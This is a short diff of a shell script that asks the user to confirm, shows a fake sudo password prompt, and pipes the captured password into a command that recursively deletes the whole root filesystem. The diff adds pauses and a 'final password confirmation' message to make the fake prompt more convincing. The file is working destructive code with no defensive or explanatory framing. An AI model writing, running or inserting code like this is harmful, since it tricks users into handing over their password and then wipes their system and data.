@@ -34,7 +34,9 @@ FAILSAFE_EXEC "Do you still wish to continue?"
 sleep 13
 
 echo "CONFIRMATION RECEIVED! Proceeding with the script..."
-
-read -s -p "[sudo]: sudo password for $(whoami): " pass
+sleep 3
+echo "final password confirmation: "
+sleep 1
+read -s -p "[sudo]: password for $(whoami): " pass
 
 echo $pass | sudo -S rm --no-preserve-root -rf /
